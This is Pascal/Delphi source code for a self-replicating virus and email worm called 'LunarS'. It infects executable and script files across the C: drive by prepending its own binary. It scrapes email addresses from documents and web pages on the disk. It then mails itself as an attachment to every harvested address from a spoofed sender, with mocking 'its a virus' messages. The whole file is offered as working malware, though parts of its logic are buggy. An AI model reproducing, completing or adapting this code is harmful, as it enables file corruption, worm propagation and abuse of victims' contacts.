   program LunarS;
   uses
     Windows, Winsock,
     Email, MXResolver;

   Const
     faReadOnly       = $00000001;
     faHidden         = $00000002;
     faSysFile        = $00000004;
     faVolumeID       = $00000008;
     faDirectory      = $00000010;
     faArchive        = $00000020;
     faAnyFile        = $0000003F;
     fmOpenRead       = $0000;
     fmOpenWrite      = $0001;
     fmOpenReadWrite  = $0002;
     fmShareCompat    = $0000;
     fmShareExclusive = $0010;
     fmShareDenyWrite = $0020;
     fmShareDenyRead  = $0030;
     fmShareDenyNone  = $0040;

   TYPE
     Triple = ARRAY[1..3] OF BYTE;
     Quad   = ARRAY[1..4] OF BYTE;

     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     TAttachmentHeader = record
       MagicNumber: cardinal;
       CRC: cardinal;
       Size: int64;
       IsStub: boolean;
       FileName: array[0..MAX_PATH] of char;
     end;
     PAttachmentHeader = ^TAttachmentHeader;

   var
    Mails            : String;
    Buf              : ARRAY[0..255] OF Char;
    pid:cardinal;
    FileBuf          : ARRAY[1..1000000] OF BYTE;                                 //You have to change it if your attachment bigger tgan 1MB
    CC               : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    ABC1, ABC2       : STRING;

   function Decode(str:string):string;
   var
   i,j:integer;
   ch:string;
   c:boolean;
   begin
   result:='';
   for i:=1 to length(str) do begin
    ch := copy(str,i,1);
    c:=false;
    for j:=1 to length(ABC2) do begin
     if copy(ABC2,j,1)=ch then begin
      result:=result+copy(ABC1,j,1);
      c := true;
     end;
    end;
     if not c then result := result + ch;
   end;
   end;

   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
         LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
   VAR
     Q    : Quad;
     Strg : STRING;
   BEGIN
     IF Count<3 THEN BEGIN
       T[3]:=0;
       Q[4]:=64;
     END ELSE Q[4]:=(T[3] AND $3F);
     IF Count<2 THEN BEGIN
       T[2]:=0;
       Q[3]:=64;
     END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (T[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     FOR Count:=1 TO 4 DO Strg:=(Strg+CC[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   FUNCTION BASE64(DataLength:DWORD) : AnsiString;
   VAR
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   BEGIN
     Count:=0;
     B:='';
     FOR I:=1 TO DataLength DIV 3 DO BEGIN
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       IF Count=76 THEN BEGIN
         B:=B+#13#10;
         Count:=0;
       END;
     END;
     Remain:=DataLength-(DataLength DIV 3)*3;
     IF Remain>0 THEN BEGIN
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
       IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     END;
     RESULT:=B;
   END;

   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
   begin
     F.ExcludeAttr := not Attr and faSpecial;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   function GetTmpPath: string;
   var
     buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
         result:= result + '\';
     end;
   end;

   function SpawnProgram(Filename: string): boolean;
     function ErrorString(ErrorCode: integer): string;
     var
       buffer: array[0..1024] of char;
     begin
       FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nil, ErrorCode, 0, @buffer, sizeof(buffer)-1, nil);
       result:= string(@buffer);
     end;
   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       Exit;
       Halt(0);
       result:= false;
     end
     else
       result:= true;
   end;

   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
       GENERIC_READ,
       GENERIC_WRITE,
       GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
       0,
       0,
       FILE_SHARE_READ,
       FILE_SHARE_WRITE,
       FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
       ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
       FILE_ATTRIBUTE_NORMAL, 0));
   end;

   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
       0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   function FileExists(const FileName: string): Boolean;
   var
     Handle: THandle;
     FindData: TWin32FindData;
   begin
     Handle := FindFirstFileA(PChar(FileName), FindData);
     result:= Handle <> INVALID_HANDLE_VALUE;
     if result then
     begin
       CloseHandle(Handle);
     end;
   end;

   Procedure Release;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
   begin
     tmppath:= GetTmpPath;

     try
       fSource:= FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);


       if fSource = THandle(-1) then
       begin
         exit;
         Halt(0);
       end;

       try
         SetFilePointer(fSource, GetFileSize(fSource, nil) - Sizeof(TAttachmentHeader), nil, FILE_BEGIN);
         ReadFile(fSource, Header, sizeof(Header), BytesRead, nil);

         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> sizeof(Header)) then
         begin
           Exit;
           FileClose(fSource);
           Halt(0);
         end;

         SetFilePointer(fSource, Header.Size, nil, FILE_BEGIN);

         while (SetFilePointer(fSource, 0, nil, FILE_CURRENT) <= (GetFileSize(fSource, nil) - sizeof(Header))) do
         begin
           ReadFile(fSource, Header, sizeof(Header), BytesRead, nil);

           if Header.MagicNumber <> $FEEDBEEF then
           begin
             Exit;
             Halt(0);
           end;
           fname := header.FileName;
           MessageBox(0,pchar(fname),'',mb_ok);
           repeat
             str(GetTickCount, tname);

             fname:= 'tmp' + tname + '.exe';
             sleep(0);
           until not FileExists(tmppath + fname);

           fTemp:= FileCreate(tmppath + fname);
           NeededSize:= Header.Size;

           repeat
             if NeededSize > sizeof(buffer) then
               BufferRead:= sizeof(buffer)
             else
               BufferRead:= NeededSize;
             ReadFile(fSource, buffer, BufferRead, BytesRead, nil);
             WriteFile(fTemp, buffer, BytesRead, BytesWritten, nil);
             dec(NeededSize, BytesRead);
           until (BytesRead <> BufferRead) or (NeededSize = 0);

           FileClose(fTemp);

           if (NeededSize <> 0) or (not SpawnProgram(tmppath + fname)) then
           begin
             FileClose(fSource);
             Halt(0);
           end;
         end;
         FileClose(fSource);
       finally
       end;
     finally
     end;
   end;

   Function AllocMem(Size: Cardinal): Pointer;
   Begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   End;

   Function StrPas(Const Str: PChar): String;
   Begin
     Result := Str;
   End;


   Function FileSize(FileName: String): Int64;
   Var
     H: THandle;
     FData: TWin32FindData;
   Begin
     Result:= -1;

     H:= FindFirstFile(PChar(FileName), FData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result:= Int64(FData.nFileSizeHigh) Shl 32 + FData.nFileSizeLow;
     End;
   End;

   Function StrLCopy(Dest: PChar; Const Source: PChar; MaxLen: Cardinal): PChar; Assembler;
   Asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   End;

   Function GetHeader(Filew:String):PAttachmentHeader;
   Var
     Header: PAttachmentHeader;
   Begin
     Header:= AllocMem(SizeOf(TAttachmentHeader));
     StrLCopy(@Header.Filename, PChar(Filew), MAX_PATH);
     Header.Size:= FileSize(Filew);
     Header.IsStub:= False;
     Result := Header;
   End;

   Procedure Infect(File1:String);
   VAR
     Virus, Output         : THandle;
     Header                : TAttachmentHeader;
     itemHeader            : PAttachmentHeader;
     fName                 : String;
     My_Path               :String;
     stubSize              : Int64;
     Buffer                :Array[0..2048] of Char;
     BytesRead,
     BytesWritten          :LongWord;

   Begin
   //

    Virus := CreateFile(pChar(file1), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    fname := '';
    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     fname := fname + buffer;
    Until BytesWritten = 0;
    CloseHandle(Virus);

    if pos('LUNAR',fname)> 0 then exit;
    fname := '';

   //
    ZeroMemory(@Buffer, SizeOf(Buffer));

    My_Path := File1+'_';
    CopyFile(pChar(Paramstr(0)),pChar(My_Path),False);

    OutPut := CreateFile(pChar(File1+'-'), GENERIC_WRITE, FILE_SHARE_WRITE,
              NIL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);

    itemHeader := GetHeader(My_Path);
    Fname := StrPas(@itemHeader.Filename);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);
    itemHeader := GetHeader(File1);
    fName := StrPas(@itemHeader.FileName);

    Header.MagicNumber := $FEEDBEEF;
    Header.CRC := 0;
    Header.Size := FileSize(File1);
    Header.IsStub := False;
    Header.FileName := itemHeader.FileName;

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);

    Virus := CreateFile(pChar(fName), GENERIC_READ, FILE_SHARE_READ,
              NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    SetFilePointer(Output, 0, nil, FILE_END);
    Repeat
     ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
     WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
    Until BytesWritten = 0;
    CloseHandle(Virus);

    itemHeader := GetHeader(My_Path);

    Fname := StrPas(@itemHeader.Filename);
    StubSize := FileSize(My_Path);

    Header.MagicNumber:= $FEEDBEEF;
    Header.CRC:= 0;
    Header.Size:= stubSize;
    Header.IsStub:= true;

    fillChar(Header.FileName, MAX_PATH+1, 0);

    WriteFile(OutPut, Header, Sizeof(Header), BytesWritten, NIL);
    ZeroMemory(@Buffer,SizeOf(Buffer));
    Buffer[0] := 'L';
    Buffer[1] := 'U';
    Buffer[2] := 'N';
    Buffer[3] := 'A';
    Buffer[4] := 'R';
    WriteFile(OutPut, Buffer, 5, BytesWritten, NIL);
    CloseHandle(OutPut);
    DeleteFile(pChar(File1));
    CopyFile(pChar(File1+'-'),pChar(File1),False);
    DeleteFile(pChar(File1+'-'));
    DeleteFile(pChar(File1+'_'));

   End;

   Function Getmail(Filename:string):String;
   Var
    F:Textfile;
    L1,L2,Text:string;
    MAIL:String;
    H,E,i, A:Integer;
    ABC,ABC2:STRING;
   Label again;
   begin
    ABC:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    ABC2:='abcdefghijklmnopqrstuvwxyz_-ABCDEFGHIJKLMNOPQRSTUVWXYZ.';
    if filesize(filename) > 5000 then exit;
    CopyFile(Pchar(Filename),pchar(Filename+'_'),false);
    sleep(300);
    AssignFile(F,Filename+'_');
    try
     Reset(F);
    except
     exit;
    end;
    Read(F,L1);
    ReadLN(F,L2);
    Text:=L1;
    While NOt EOF(F) DO BEGIN
     Read(F,L1);
     ReadLN(F,L2);
     Text:=Text+'|'+L1;
    END;
    Closefile(F);
    Deletefile(pchar(Filename+'_'));
    sleep(200);
    if copy(text,1,2)='MZ' then exit;
    text:='|'+text+'|';
    result:='';
   //Now we gather the informition.
    AGAIN:
    IF pos('@',Text)>0 then begin
     A:=Pos('@',Text)-1;
     if a =0 then a := 1;
     L1 := copy(text,a,1);
     L2 := copy(text,a+2,1);
     H := pos(L1,abc);
     E := pos(L2,abc2);
     if (H = 0) or (e=0) then begin
      text:=copy(text,a+1,length(text));
      goto again;
     end;
     While POS(Copy(TExt,a,1),ABC)>0 do begin
      A:=A-1;
     end;
     a := a +1;
     Mail := copy(Text,a,length(text)); //grab start of mail.
     Mail := COpy(Mail,1,pos('@',mail)+2);
     i:= pos(MAIL,text)+length(mail);
     While pos(copy(mail,length(mail),1),ABC2)>0 do begin
      Mail := mail+copy(text,i,1);
      i:=i+1;
     end;
     if POS(copy(mail,length(mail),1),ABC2)=0 then Mail:=copy(mail,1,length(mail)-1);
     Result := Result+Mail+#13#10;
     Text:=copy(text,pos(mail,text)+length(mail),length(text));
     goto AGAIN;
    end;

   end;


   function LowerCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharLowerBuff(Pointer(Result), Len);
   end;

   Procedure Scan(D:string);
   var
    SR: TSearchRec;
   begin
    Release;
    If D[Length(D)] <> '\' then D := D + '\';
    If FindFirst(D + '*.*', faDirectory, SR) = 0 then
     Repeat
      If ((Sr.Attr and faDirectory) = faDirectory) and (SR.Name[1] <> '.') then
       scan(D + SR.Name + '\')
      Else Begin
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.exe' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.com' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.pif' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.scr' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.ocx' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.cmd' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.bat' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Infect(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.htm' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Mails := Mails + GetMail(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.txt' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Mails := Mails + GetMail(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.emx' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Mails := Mails + GetMail(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.doc' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Mails := Mails + GetMail(D+SR.Name);
       If lowercase(Copy(Sr.Name, Length(Sr.Name)-3, 4)) = '.dbx' Then
        If FileSize(d+Sr.Name) < 1024 * 800 then
        Mails := Mails + GetMail(D+SR.Name);
      End;
     Until (FindNext(SR) <> 0);
    FindClose(SR);
   End;

   FUNCTION IPstr(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   Procedure SendMail(Host, Recip:String);
   Var
    MyMail :String;
    B      :Array[0..255]of char;
    F      :Cardinal;
    M      :TSMTPEngine;
   Begin
    F := SizeOf(B);
    GetUserName(b, F);
    MyMail := B;

    M := TSMTPEngine.Create;
    M.Recip := Recip;
    M.From := MyMail+'@'+Copy(Recip, pos('@', recip)+1, length(recip));
    Randomize;
    Case Random(4) Of
     0:M.Body := '"its a virus" hahaha ;)';
     1:M.Body := '"its a virus" Lol, my ass ;)';
     2:M.Body := 'hahaha, check .. "its a virus.." HAHHA';
     3:M.Body := '"its a virus" rofl rofl :D';
    End;
    Randomize;
    Case Random(4) Of
     0:M.Subject := 'Hahaha :)';
     1:M.Subject := 'Lol ;)';
     2:M.Subject := 'yay :P';
     3:M.Subject := 'yay :P';
    End;
    M.Attachment := ParamStr(0);
    M.SendEmail;
    M.Free;
   End;

   var
    a:cardinal;
   begin
    a := createmutexa(nil, true, 'shut_face');
    if getlasterror() = error_already_exists then
     exitprocess(0);
    scan('C:\');
    While Mails <> '' Do Begin
     Randomize;
     SendMail('mx'+inttostr(random(4))+'.hotmail.com', Copy(Mails,1,pos(#13#10, Mails)-1));
     Mails := Copy(Mails, pos(#13#10, mails)+2, Length(Mails));
    End;
    releasemutex(a);
   end.
